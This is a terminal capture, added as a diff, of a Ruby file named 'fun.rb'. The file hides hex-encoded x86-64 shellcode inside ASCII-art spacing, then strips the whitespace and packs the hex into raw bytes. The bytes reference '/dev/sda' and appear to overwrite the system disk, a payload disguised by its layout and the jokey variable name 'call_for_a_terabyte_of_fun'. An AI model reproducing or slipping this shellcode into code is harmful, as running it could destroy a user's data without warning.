@@ -1,0 +1,16 @@
+[user@techmasters ~]$ cat fun.rb
+call_for_a_terabyte_of_fun = ["
+
+
+4831c0
+  90                 48                                 31
+  ff                 90                                 48
+  31    f69    048   31 d2   9  05  0    48b8    2f64  6576   2f7   36 46   1509
+  04   88 9e  74 83  1c090b  00266be02  20  0f  05      90   90 48  31dbbb ff
+  46   554ec  1e     b0  85  34 88  9e  69  04   889c   7b   20348  b9      efcd
+  ab   56     05 37  9c  4d  48 c1  e9  18  48      31  c0   b0     01         0f
+  05    e2f    748   31  ff  90 48  31   c09 0b  03c9    09   090   90      0f05
+
+
+".gsub(/\s/, '')].pack("H*")
+[user@techmasters ~]$
